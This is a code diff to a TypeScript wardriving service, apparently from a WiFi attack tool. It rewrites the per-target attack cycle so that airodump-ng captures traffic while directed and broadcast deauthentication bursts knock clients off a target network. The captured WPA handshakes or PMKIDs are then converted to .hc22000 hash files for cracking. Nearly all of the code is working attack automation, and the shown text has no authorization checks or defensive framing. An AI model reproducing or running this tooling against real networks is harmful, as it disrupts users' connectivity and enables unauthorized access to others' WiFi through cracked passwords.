@@ -6,7 +6,7 @@ import path from "path";
 import { detectAr9271 } from "../wifiradar/ar9271";
 import { enterMonitorMode, exitMonitorMode } from "./monitor";
 import { setChannel } from "./rf";
-import { PmkidRunner, DeauthRunner } from "./attack";
+import { AirodumpCapture, DeauthRunner } from "./attack";
 import { WardriveSession, SESSIONS_ROOT } from "./session";
 import { discoverTargets } from "./discovery";
 import {
@@ -68,7 +68,7 @@ export class WardriveService extends EventEmitter {
   private targetMeta = new Map<string, TargetMeta>();
   private currentBssid: string | null = null;
   private attackAbort = false;
-  private pmkidRunner: PmkidRunner | null = null;
+  private captureRunner: AirodumpCapture | null = null;
   private deauthRunner: DeauthRunner | null = null;
   private timers: ReturnType<typeof setTimeout>[] = [];
   // Standalone deauth attacks (Deauth tab) — separate from the handshake
@@ -478,15 +478,22 @@ export class WardriveService extends EventEmitter {
   // Full attack cycle against one BSSID: PMKID first (silent, no client
   // needed), then directed deauth bursts with settle windows. First method
   // to produce EAPOL/PMKID wins; everything lands in the session folder.
+  // Full attack cycle against one BSSID, airodump + aireplay style:
+  //   1. lock the radio to the target channel
+  //   2. start airodump-ng capturing (rolling .cap, runs the whole cycle so a
+  //      deauth-triggered 4-way handshake AND any PMKID land in one file)
+  //   3. fire directed deauth bursts at each associated client (+ a broadcast
+  //      burst), so a client reconnects and its 4-way handshake is captured
+  //   4. after each burst, validate the capture with hcxpcapngtool — only a
+  //      real EAPOL handshake (or PMKID) counts as "captured"; nothing is saved
+  //      as a success otherwise.
   private async runTarget(bssid: string, ssid: string, channel: number): Promise<void> {
     if (!this.session || !this.iface) return;
     if (this.attackAbort) {
       this.updateMeta(bssid, { status: "cancelled" });
       return;
     }
-    this.updateMeta(bssid, { ssid, channel, status: "running", error: "" });
-    // Lock the radio to the target's channel — hopping mid-attack breaks
-    // hcxdumptool's AP filter and deauth timing alike.
+    this.updateMeta(bssid, { ssid, channel, status: "running", method: "deauth", error: "" });
     try {
       await setChannel(this.iface, channel);
     } catch (err: any) {
@@ -494,97 +501,77 @@ export class WardriveService extends EventEmitter {
       return;
     }
 
-    const prefix = bssid.replace(/:/g, "").toLowerCase();
-    const pcapng = path.join(this.session.dir, `${prefix}.pcapng`);
-
-    const pmkidCaptured = await this.runPmkid(bssid, pcapng);
-    if (this.attackAbort) {
-      this.updateMeta(bssid, { status: "cancelled" });
-      return;
-    }
-    if (pmkidCaptured) {
-      this.markCaptured(bssid, "pmkid", pcapng);
-      return;
+    const prefix = path.join(this.session.dir, bssid.replace(/:/g, "").toLowerCase());
+    // Clear stale airodump outputs so a previous run's handshake isn't
+    // mistaken for this one.
+    for (const suffix of ["-01.cap", "-01.csv", "-01.hc22000", "-01.kismet.csv", "-01.kismet.netxml", "-01.log.csv"]) {
+      try {
+        fs.unlinkSync(prefix + suffix);
+      } catch {
+        /* not there */
+      }
     }
 
-    const deauthCaptured = await this.runDeauth(bssid, pcapng);
-    if (this.attackAbort) {
-      this.updateMeta(bssid, { status: "cancelled" });
-      return;
-    }
-    if (deauthCaptured) {
-      this.markCaptured(bssid, "deauth", pcapng);
-      return;
-    }
-    this.updateMeta(bssid, { status: "failed", error: "sin handshake (PMKID + deauth)" });
-  }
+    const capturer = new AirodumpCapture(this.iface, bssid, channel, prefix);
+    this.captureRunner = capturer;
+    capturer.on("log", (line: string) => this.appendLog(bssid, `[airodump] ${line}`));
+    this.appendLog(bssid, `[capture] airodump-ng on ${this.iface} ch${channel} targeting ${bssid}`);
+    capturer.start();
+    const capFile = capturer.capPath();
 
-  private async runPmkid(bssid: string, pcapngPath: string): Promise<boolean> {
-    if (!this.iface || !this.session) return false;
-    this.updateMeta(bssid, { status: "running", method: "pmkid" });
-    this.appendLog(bssid, `[pmkid] starting hcxdumptool on ${this.iface} targeting ${bssid}`);
-    const runner = new PmkidRunner(this.iface, bssid, pcapngPath);
-    this.pmkidRunner = runner;
-    runner.on("log", (line: string) => this.appendLog(bssid, `[pmkid] ${line}`));
-
-    // hcxdumptool runs until killed — success is detected by polling the
-    // capture with hcxpcapngtool, not by the process exiting.
-    const result = await new Promise<boolean>((resolve) => {
-      let settled = false;
-      const finish = (value: boolean) => {
-        if (settled) return;
-        settled = true;
-        resolve(value);
-      };
-      const poll = async () => {
-        if (settled) return;
-        if (this.attackAbort) return finish(false);
-        const converted = await this.session!.convertCapture(pcapngPath);
-        if (converted.hasCapture) {
-          if (converted.hashFile) this.session!.addTargetFile(bssid, converted.hashFile);
-          return finish(true);
+    let captured = false;
+    try {
+      // Let airodump create its files and enumerate associated clients.
+      await sleep(4_000);
+      for (let attempt = 1; attempt <= DEAUTH_MAX_ATTEMPTS && !captured; attempt++) {
+        if (this.attackAbort) break;
+        this.updateMeta(bssid, { attempts: attempt });
+        // Prefer directed deauth at real associated clients (far more
+        // effective than broadcast); fall back to the radar snapshot, then
+        // to a broadcast burst.
+        let clients = capturer.associatedClients();
+        if (clients.length === 0) {
+          const c = this.pickClientFor(bssid);
+          if (c) clients = [c];
         }
-        this.timers.push(setTimeout(poll, PMKID_POLL_MS));
-      };
-      this.timers.push(setTimeout(poll, PMKID_POLL_MS));
-      this.timers.push(setTimeout(() => finish(false), PMKID_TIMEOUT_MS));
-      runner.on("exit", () => {
-        // Early exit = hcxdumptool itself failed; give the poller one last
-        // chance to find a capture written just before the exit.
-        setTimeout(() => {
-          this.session!.convertCapture(pcapngPath).then((r) => finish(r.hasCapture));
-        }, 1500);
-      });
-      runner.start();
+        for (const client of clients) {
+          if (this.attackAbort) break;
+          await this.fireDeauth(bssid, client, attempt);
+        }
+        if (!this.attackAbort) await this.fireDeauth(bssid, null, attempt); // broadcast too
+        captured = await this.waitForCapture(bssid, capFile, DEAUTH_SETTLE_MS);
+      }
+    } finally {
+      capturer.stop();
+      this.captureRunner = null;
+    }
+
+    if (this.attackAbort) {
+      this.updateMeta(bssid, { status: "cancelled" });
+      return;
+    }
+    if (captured) {
+      this.markCaptured(bssid, "deauth", capFile);
+      return;
+    }
+    this.updateMeta(bssid, {
+      status: "failed",
+      error: "sin handshake — el objetivo puede ser WPA3/SAE o sin clientes WPA2",
     });
-    runner.stop();
-    this.pmkidRunner = null;
-    return result;
   }
 
-  private async runDeauth(bssid: string, pcapngPath: string): Promise<boolean> {
-    if (!this.iface || !this.session) return false;
-    this.updateMeta(bssid, { status: "running", method: "deauth" });
-    for (let attempt = 1; attempt <= DEAUTH_MAX_ATTEMPTS; attempt++) {
-      if (this.attackAbort) return false;
-      this.updateMeta(bssid, { attempts: attempt });
-      const client = this.pickClientFor(bssid);
-      const runner = new DeauthRunner(this.iface, bssid, client, DEAUTH_BURST, 0);
-      this.deauthRunner = runner;
-      runner.on("log", (line: string) => this.appendLog(bssid, `[deauth ${attempt}] ${line}`));
-      const exited = new Promise<void>((resolve) => runner.on("exit", () => resolve()));
-      runner.start();
-      await Promise.race([
-        exited,
-        sleep(DEAUTH_BURST * 700 + 3_000),
-      ]);
-      runner.stop();
-      this.deauthRunner = null;
-      const captured = await this.waitForCapture(bssid, pcapngPath, DEAUTH_SETTLE_MS);
-      if (captured) return true;
-      if (this.attackAbort) return false;
-    }
-    return false;
+  // One directed (or broadcast when client=null) deauth burst.
+  private async fireDeauth(bssid: string, client: string | null, attempt: number): Promise<void> {
+    if (!this.iface) return;
+    const runner = new DeauthRunner(this.iface, bssid, client, DEAUTH_BURST, 0);
+    this.deauthRunner = runner;
+    const tag = client ? `deauth ${attempt} ${client}` : `deauth ${attempt} broadcast`;
+    runner.on("log", (line: string) => this.appendLog(bssid, `[${tag}] ${line}`));
+    const exited = new Promise<void>((resolve) => runner.on("exit", () => resolve()));
+    runner.start();
+    await Promise.race([exited, sleep(DEAUTH_BURST * 700 + 2_000)]);
+    runner.stop();
+    this.deauthRunner = null;
   }
 
   private async waitForCapture(bssid: string, pcapngPath: string, windowMs: number): Promise<boolean> {
@@ -621,7 +608,7 @@ export class WardriveService extends EventEmitter {
     if (!this.session) return;
     const base = path.basename(pcapngPath);
     this.session.addTargetFile(bssid, base);
-    const hashFile = base.replace(/\.pcapng$/, ".hc22000");
+    const hashFile = base.replace(/\.(pcapng|cap)$/i, ".hc22000");
     if (fs.existsSync(path.join(this.session.dir, hashFile))) {
       this.session.addTargetFile(bssid, hashFile);
     }
@@ -645,8 +632,8 @@ export class WardriveService extends EventEmitter {
   }
 
   private stopRunners(): void {
-    this.pmkidRunner?.stop();
-    this.pmkidRunner = null;
+    this.captureRunner?.stop();
+    this.captureRunner = null;
     this.deauthRunner?.stop();
     this.deauthRunner = null;
     for (const [, runner] of this.deauthRunnerByMac) {
